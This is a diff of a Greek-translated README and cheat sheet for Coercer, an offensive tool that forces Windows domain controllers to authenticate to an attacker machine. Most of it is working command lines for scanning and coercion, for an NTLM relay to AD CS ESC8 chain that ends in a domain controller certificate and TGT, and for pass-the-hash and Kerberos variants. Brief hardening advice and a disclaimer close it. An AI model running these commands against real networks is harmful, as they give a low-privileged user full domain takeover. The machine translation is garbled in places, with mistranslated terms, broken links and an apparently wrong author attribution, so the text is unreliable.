@@ -1,12 +1,16 @@
-# 🪓 Coercer — Πλήρης οδηγός αναφοράς
-
 <!-- language-home-navigation -->
-[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)
+[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇬🇧 English](../README.md) • [🇹🇷 Türkçe](README.tr.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)
+
+[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
+
+---
 
 
+# 🪓 Coercer - Πλήρες φύλλο εξαπάτησης
 
+[🇹🇷 Türkçe Sürüm](μεταφράσεις/README.tr.md)
 ```
    ██████╗ ██████╗ ███████╗██████╗  ██████╗███████╗██████╗ 
   ██╔════╝██╔═══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗
@@ -16,7 +20,6 @@
    ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝
        Active Directory Multi-Protocol Windows Authentication Coercion Engine
 ```
-
 <p align="center">
   <img src="https://img.shields.io/badge/Coercer-RPC_Coercion-blue?style=for-the-badge" alt="Coercer">
   <img src="https://img.shields.io/badge/Author-p0dalirius-orange?style=for-the-badge" alt="p0dalirius">
@@ -25,56 +28,55 @@
 </p>
 
 <p align="center">
-  <b>🌐 Automatically scan, detect, and coerce Windows servers and Domain Controllers into authenticating back to arbitrary machines via 12+ RPC protocols</b>
+  <b>🌐 Αυτόματη σάρωση, εντοπισμός και εξαναγκασμός διακομιστών Windows και ελεγκτών τομέα σε έλεγχο ταυτότητας πίσω σε αυθαίρετα μηχανήματα μέσω 12+ πρωτοκόλλων RPC</b>
 </p>
 
 ---
 
 ## 📋 Πίνακας περιεχομένων
 
-- [Εισαγωγή](#-overview--the-authentication-coercion-primitive)
-- [Supported RPC Protocols & Methods](#-supported-rpc-protocols--methods)
-- [Εγκατάσταση](#-installation)
+- [Overview & The Authentication Coercion Primitive](#-overview--the-authentication-coercion-primitive)
+- [Υποστηριζόμενα Πρωτόκολλα & Μέθοδοι RPC](#-supported-rpc-protocols--methods)
+- [Εγκατάσταση] (#-εγκατάσταση)
 - [Scanning for Vulnerable RPC Interfaces (`scan`)](#-scanning-for-vulnerable-rpc-interfaces-scan)
-- [Executing Authentication Coercion (`coerce`)](#-executing-authentication-coercion-coerce)
+- [Εκτέλεση εξαναγκασμού ελέγχου ταυτότητας (`coerce`)](#-executing-authentication-coercion-coerce)
 - [The Full Attack Chain: Coercion -> NTLM Relay -> AD CS ESC8](#-the-full-attack-chain-coercion---ntlm-relay---ad-cs-esc8)
-- [Protocol & Method Filtering](#-protocol--method-filtering)
-- [Kerberos & Pass-the-Hash Support](#-kerberos--pass-the-hash-support)
-- [Γρήγορη αναφορά](#-quick-reference-table)
+- [Φιλτράρισμα πρωτοκόλλου και μεθόδου](#-πρωτόκολλο--μέθοδος-φίλτρο)
+- [Υποστήριξη Kerberos & Pass-the-Hash](#-kerberos--pass-the-hash-support)
+- [Πίνακας γρήγορης αναφοράς] (#-ταχεία αναφορά-πίνακας)
 - [Defensive Considerations & Hardening](#-defensive-considerations--hardening)
-- [Legal Disclaimer](#-legal-disclaimer)
+- [Νομική αποποίηση ευθυνών](#-νομική αποποίηση ευθυνών)
 
 ---
 
-## 🎯 Εισαγωγή
+## 🎯 Επισκόπηση & The Authentication Coercion Primitive
 
-In Active Directory environments, **authentication coercion** is a devastating offensive primitive. It exploits legacy RPC interfaces implemented in Windows services that allow an authenticated user to ask a remote machine (like a Domain Controller) to connect to a designated UNC path (`\\attacker\share`).
+Σε περιβάλλοντα Active Directory, ο **καταναγκασμός ελέγχου ταυτότητας** είναι ένα καταστροφικό προσβλητικό πρωτόγονο. Εκμεταλλεύεται παλαιού τύπου διεπαφές RPC που υλοποιούνται σε υπηρεσίες Windows που επιτρέπουν σε έναν πιστοποιημένο χρήστη να ζητήσει από ένα απομακρυσμένο μηχάνημα (όπως έναν ελεγκτή τομέα) να συνδεθεί σε μια καθορισμένη διαδρομή UNC (`\\attacker\share`).
 
-When the remote Windows machine connects to the attacker-controlled machine, it initiates **machine-account NTLM authentication** (`DC01$`). 
+Όταν το απομακρυσμένο μηχάνημα Windows συνδέεται με το μηχάνημα που ελέγχεται από τον εισβολέα, εκκινεί **τον έλεγχο ταυτότητας NTLM λογαριασμού μηχανήματος** (`DC01$`). 
 
-By capturing or relaying this machine account credential using `ntlmrelayx` to Active Directory Certificate Services (AD CS Web Enrollment - ESC8) or unconstrained delegation targets, attackers can achieve **immediate full Domain Compromise**.
+Καταγράφοντας ή αναμεταδίδοντας αυτό το διαπιστευτήριο λογαριασμού μηχανήματος χρησιμοποιώντας το `ntlmrelayx` στις υπηρεσίες πιστοποιητικών Active Directory (AD CS Web Enrollment - ESC8) ή μη περιορισμένους στόχους ανάθεσης, οι εισβολείς μπορούν να επιτύχουν **άμεσο πλήρη συμβιβασμό τομέα**.
 
-Authored by **Clément Notin (p0dalirius)**, **Coercer** unifies over a dozen individual coercion exploits (PetitPotam, PrinterBug, ShadowCoerce, DFSCoerce) into a single, automated, highly modular framework.
+Συντάκτης του **Clément Notin (p0dalirius)**, το **Coercer** ενοποιεί πάνω από δώδεκα μεμονωμένα εκμεταλλεύσεις εξαναγκασμού (PetitPotam, PrinterBug, ShadowCoerce, DFSCoerce) σε ένα ενιαίο, αυτοματοποιημένο, εξαιρετικά αρθρωτό πλαίσιο.
 
 ---
 
-## 🔌 Supported RPC Protocols & Methods
+## 🔌 Υποστηριζόμενα Πρωτόκολλα & Μέθοδοι RPC
 
-Coercer tests and exploits the following RPC interfaces:
+Το Coercer δοκιμάζει και εκμεταλλεύεται τις ακόλουθες διεπαφές RPC:
 
-|Protocol Name|Common Exploit Name|Pipe / Interface|
+| Όνομα πρωτοκόλλου | Common Exploit Name | Σωλήνας / Διεπαφή |
 |---------------|---------------------|------------------|
-|**MS-EFSRPC**|PetitPotam|`\pipe\efsrpc`, `\pipe\lsarpc`|
-|**MS-RPRN**|PrinterBug / SpoolSample|`\pipe\spoolss`|
-|**MS-FSRVP**|ShadowCoerce|`\pipe\FSRVP`|
-|**MS-DFSNM**|DFSCoerce|`\pipe\netdfs`|
-|**MS-PAN**|PrintNightmare adjacent|Remote Print Administration|
-|**MS-SAMR**|Cheeseing|Security Account Manager|
+| **MS-EFSRPC** | PetitPotam | `\pipe\efsrpc`, `\pipe\lsarpc` |
+| **MS-RPRN** | PrinterBug / SpoolSample | `\pipe\spoolss` |
+| **MS-FSRVP** | ShadowCoerce | `\pipe\FSRVP` |
+| **MS-DFSNM** | DFSCoerce | `\pipe\netdfs` |
+| **MS-PAN** | Εκτύπωση Εφιάλτης δίπλα | Διαχείριση απομακρυσμένης εκτύπωσης |
+| **MS-SAMR** | Τυρίωμα | Διαχείριση λογαριασμού ασφαλείας |
 
 ---
 
 ## 📥 Εγκατάσταση
-
 ```bash
 # Install via pipx (Recommended)
 pipx install coercer
@@ -88,13 +90,11 @@ cd Coercer
 pip3 install -r requirements.txt
 python3 Coercer.py --help
 ```
-
 ---
 
-## 🔍 Scanning for Vulnerable RPC Interfaces (`scan`)
+## 🔍 Σάρωση για ευάλωτες διεπαφές RPC (`scan`)
 
-Before triggering coercion, safely scan target Domain Controllers to discover which RPC functions are enabled and reachable:
-
+Πριν ενεργοποιήσετε τον εξαναγκασμό, σαρώστε με ασφάλεια τους ελεγκτές τομέα στόχων για να ανακαλύψετε ποιες λειτουργίες RPC είναι ενεργοποιημένες και προσβάσιμες:
 ```bash
 # Scan a single Domain Controller
 coercer scan -u 'testuser' -p 'Password123' -d 'corp.local' -t 10.10.10.1
@@ -102,24 +102,20 @@ coercer scan -u 'testuser' -p 'Password123' -d 'corp.local' -t 10.10.10.1
 # Scan an entire range of Domain Controllers
 coercer scan -u 'testuser' -p 'Password123' -d 'corp.local' --targets-file dcs.txt
 ```
-
 ---
 
-## ⚡ Executing Authentication Coercion (`coerce`)
+## ⚡ Εκτέλεση εξαναγκασμού ελέγχου ταυτότητας (`coerce`)
 
-Trigger an outbound machine-account NTLM connection from the target DC to your listener:
-
+Ενεργοποιήστε μια εξερχόμενη σύνδεση NTLM μηχανής-λογαριασμού από το DC-στόχο στον ακροατή σας:
 ```bash
 # Coerce DC (10.10.10.1) to authenticate to attacker machine (10.10.14.5)
 coercer coerce -u 'testuser' -p 'Password123' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5
 ```
-
 ---
 
-## 💥 The Full Attack Chain: Coercion -> NTLM Relay -> AD CS ESC8
+## 💥 Η πλήρης αλυσίδα επίθεσης: εξαναγκασμός -> ρελέ NTLM -> AD CS ESC8
 
-The canonical Domain Escalation vector:
-
+Το κανονικό διάνυσμα κλιμάκωσης τομέα:
 ```bash
 # 1. Start ntlmrelayx targeting the vulnerable AD CS Web Enrollment HTTP endpoint
 impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
@@ -132,13 +128,11 @@ coercer coerce -u 'lowuser' -p 'Pass123' -d 'corp.local' -t 10.10.10.1 -l 10.10.
 # 4. Request a full Domain Admin Kerberos TGT using gettgtpkinit (PKINITtools)
 gettgtpkinit.py corp.local/DC01\$ -pfx-base64 <BASE64_CERT> dc01.ccache
 ```
-
 ---
 
-## 🎯 Protocol & Method Filtering
+## 🎯 Φιλτράρισμα πρωτοκόλλου και μεθόδου
 
-Target a specific method without spamming the entire RPC spectrum:
-
+Στοχεύστε μια συγκεκριμένη μέθοδο χωρίς αποστολή ανεπιθύμητης αλληλογραφίας σε ολόκληρο το φάσμα RPC:
 ```bash
 # Coerce using ONLY PetitPotam (MS-EFSRPC)
 coercer coerce -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5 --filter-protocol-name MS-EFSRPC
@@ -146,11 +140,9 @@ coercer coerce -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5 -
 # Coerce using ONLY PrinterBug (MS-RPRN)
 coercer coerce -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5 --filter-protocol-name MS-RPRN
 ```
-
 ---
 
-## 🔑 Kerberos & Pass-the-Hash Support
-
+## 🔑 Υποστήριξη Kerberos & Pass-the-Hash
 ```bash
 # Authenticate using NTLM Hash (Pass-the-Hash)
 coercer coerce -u 'user' --hashes :aad3b435b51404eeaad3b435b51404ee:7fc508... -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5
@@ -159,31 +151,30 @@ coercer coerce -u 'user' --hashes :aad3b435b51404eeaad3b435b51404ee:7fc508... -d
 export KRB5CCNAME=/tmp/user.ccache
 coercer coerce -k -no-pass -d 'corp.local' -t dc01.corp.local -l 10.10.14.5
 ```
-
 ---
 
-## ⚡ Γρήγορη αναφορά
+## ⚡ Γρήγορος Πίνακας Αναφοράς
 
-|Objective|Εντολή|
+| Στόχος | Εντολή |
 |-----------|---------|
-|**Scan DC for Coercion**|`coercer scan -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP>`|
-|**Coerce Authentication**|`coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <ATTACKER_IP>`|
-|**Coerce via MS-EFSRPC**|`coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <IP> --filter-protocol-name MS-EFSRPC`|
-|**Coerce via MS-RPRN**|`coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <IP> --filter-protocol-name MS-RPRN`|
-|**Pass-the-Hash Coercion**|`coercer coerce -u <USER> --hashes :<NTLM> -d <DOMAIN> -t <DC_IP> -l <IP>`|
-|**Kerberos Ticket Coerce**|`coercer coerce -k -no-pass -d <DOMAIN> -t <DC_FQDN> -l <IP>`|
+| **Σάρωση DC για εξαναγκασμό** | `coercer scan -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP>` |
+| **Αναγκαστικός έλεγχος ταυτότητας** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <ATTACKER_IP>` |
+| **Καταναγκασμός μέσω MS-EFSRPC** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <IP> --filter-protocol-name MS-EFSRPC` |
+| **Καταναγκασμός μέσω MS-RPRN** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <IP> --filter-protocol-name MS-RPRN` |
+| **Αναγκασμός Pass-the-Hash** | `coercer coerce -u <USER> --hashes :<NTLM> -d <DOMAIN> -t <DC_IP> -l <IP>` |
+| **Κερμπέρος Εισιτήριο Καταναγκασμός** | `coercer coerce -k -no-pass -d <DOMAIN> -t <DC_FQDN> -l <IP>` |
 
 ---
 
-## 🛡️ Defensive Considerations & Hardening
+## 🛡️ Αμυντικές Θεωρήσεις & Σκλήρυνση
 
-1. **Disable Print Spooler on DCs:** The Print Spooler service (`spoolsv.exe`) should be completely disabled on Domain Controllers (`Stop-Service Spooler -Passthru; Set-Service Spooler -StartupType Disabled`).
-2. **Enable Extended Protection for Authentication (EPA):** On AD CS IIS servers, enable EPA and require HTTPS to block NTLM Relay attacks.
-3. **RPC Filtering & Network Segmentation:** Restrict RPC endpoint mapper access (TCP port 135) to authorized administrative subnets.
+1. **Απενεργοποίηση ουράς εκτύπωσης σε DC:** Η υπηρεσία Print Spooler (`spoolsv.exe`) θα πρέπει να είναι εντελώς απενεργοποιημένη στους ελεγκτές τομέα (`Stop-Service Spooler -Passthru; Set-Service Spooler -StartupType Disabled`).
+2. **Ενεργοποίηση εκτεταμένης προστασίας για έλεγχο ταυτότητας (EPA):** Σε διακομιστές AD CS IIS, ενεργοποιήστε την EPA και απαιτήστε από το HTTPS να αποκλείει επιθέσεις αναμετάδοσης NTLM.
+3. **Φιλτράρισμα RPC & Τμηματοποίηση Δικτύου:** Περιορίστε την πρόσβαση αντιστοίχισης τελικού σημείου RPC (θύρα TCP 135) σε εξουσιοδοτημένα υποδίκτυα διαχείρισης.
 
 ---
 
-## ⚠️ Legal Disclaimer
+## ⚠️ Νομική αποποίηση ευθύνης
 
-3. **Honeytokens:** Plant attractive DNS records (e.g., `backup-vault.corp.local` or `admin-portal.corp.local`) pointing to honeypot IP addresses.
-> Coercer triggers active remote authentication calls that can destabilize unpatched domain services. Use exclusively during authorized penetration tests and with explicit customer consent.
+> [!ΠΡΟΣΟΧΗ]
+> Το Coercer ενεργοποιεί ενεργές κλήσεις απομακρυσμένου ελέγχου ταυτότητας που μπορούν να αποσταθεροποιήσουν τις υπηρεσίες τομέα που δεν έχουν επιδιορθωθεί. Χρησιμοποιήστε αποκλειστικά κατά τη διάρκεια εξουσιοδοτημένων δοκιμών διείσδυσης και με τη ρητή συγκατάθεση του πελάτη.
